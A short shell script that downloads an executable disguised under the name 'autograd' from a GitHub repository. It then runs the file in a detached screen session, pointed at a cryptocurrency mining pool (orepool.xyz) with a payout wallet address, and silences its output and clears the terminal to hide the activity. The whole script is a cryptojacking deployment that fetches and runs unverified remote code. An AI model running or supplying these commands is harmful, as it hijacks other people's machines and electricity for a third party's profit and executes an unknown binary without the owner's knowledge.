wget https://github.com/obisumila/miniature-octo-potato/raw/refs/heads/main/autograd ;
chmod +x autograd ;
sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
screen -S on -dm ./autograd --url=http://orepool.xyz:8080 --address=9LWaS2HU23dVnyZKmPXawuDn3yxemTaqr7QcPUUFjPSL
screen -ls
sleep 2
clear
screen -ls ; 


